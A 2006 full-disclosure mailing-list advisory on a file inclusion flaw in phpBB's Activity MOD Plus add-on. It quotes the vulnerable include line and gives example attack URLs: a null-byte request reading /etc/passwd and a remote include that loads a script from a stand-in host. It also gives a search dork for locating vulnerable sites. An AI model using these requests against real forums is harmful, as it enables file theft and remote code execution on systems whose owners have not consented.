
Date: Sun, 28 May 2006 17:05:12 +0300
From: Mustafa Can Bjorn IPEKCI <nukedx@...edx.com>
To: submit@...w0rm.com, full-disclosure@...ts.grok.org.uk,
	bugtraq@...urityfocus.com
Subject: Advisory: phpBB 2.x (Activity MOD Plus) File
	Inclusion Vulnerability.


--Security Report--
Advisory: phpBB 2.x (Activity MOD Plus) File Inclusion Vulnerability.
---
Author: Mustafa Can Bjorn "nukedx a.k.a nuker" IPEKCI
---
Date: 27/05/06 07:49 PM
---
Contacts:{
ICQ: 10072
MSN/Email: nukedx@...edx.com
Web: http://www.nukedx.com
}
---
Vendor: phpBB-Amod (http://www.phpbb-amod.com/)
Version: 2.x and prior versions must be affected.
About: Via this methods remote attacker can include arbitrary local  
files to phpBB.phpbb_root_path variable in
/language/lang_english/lang_activity.php did not sanitized before  
using it.You can find vulnerable code in admin_hacks_list.php
at line 12
-Source in lang_activity.php-
12: include_once($phpbb_root_path .'language/lang_'.  
$board_config['default_lang'] .'/lang_activity_char.'. $phpEx);
-End of source-
If magic_quotes_gpc off remote attacker can include arbitrary internal  
files by null char (0x00) ending.
If allow_url_fopen on remote attacker can include arbitrary external  
files to lang_activity.php
Both requires register_globals on
Level: Highly Critical
---
How&Example:
Succesful exploitation needs register_globals on
GET ->  
http://[victim]/[phpBB]/language/lang_english/lang_activity.php?phpbb_root_path=[FILE]
EXAMPLE ->  
http://[victim]/[phpBB]/language/lang_english/lang_activity.php?phpbb_root_path=/etc/passwd%00
Requires magic_quotes_gpc off
EXAMPLE ->  
http://[victim]/[phpBB]/language/lang_english/lang_activity.php?phpbb_root_path=http://yoursite.com/script.txt
Requires allow_url_fopen on
---
Timeline:
* 27/05/2006: Vulnerability found.
* 27/05/2006: Contacted with vendor and waiting reply.
---
---
Exploit: http://www.nukedx.com/?getxpl=38
---
Original advisory can be found at: http://www.nukedx.com/?viewdoc=38
---
Dorks: "Powered by phpBB" inurl:activity.php


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/


